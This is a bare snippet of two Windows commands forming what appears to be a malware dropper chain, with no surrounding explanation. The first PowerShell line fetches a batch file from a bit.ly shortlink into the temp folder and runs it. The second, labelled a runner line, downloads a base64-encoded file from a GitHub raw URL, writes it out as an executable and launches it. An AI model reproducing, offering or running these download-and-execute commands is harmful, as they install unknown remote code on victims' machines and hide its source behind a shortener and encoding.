GET RUNNER:
powershell -c "$p=$env:TEMP+'\.bat';(New-Object Net.WebClient).DownloadFile('https://bit.ly/3cxHURS',$p);&$p"

RUNNER LINE
@echo off
powershell -c "$p=$env:TEMP+'\a.exe'; [IO.File]::WriteAllBytes($p,[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/deep-oasis/test/main/main.enc')));start $p;"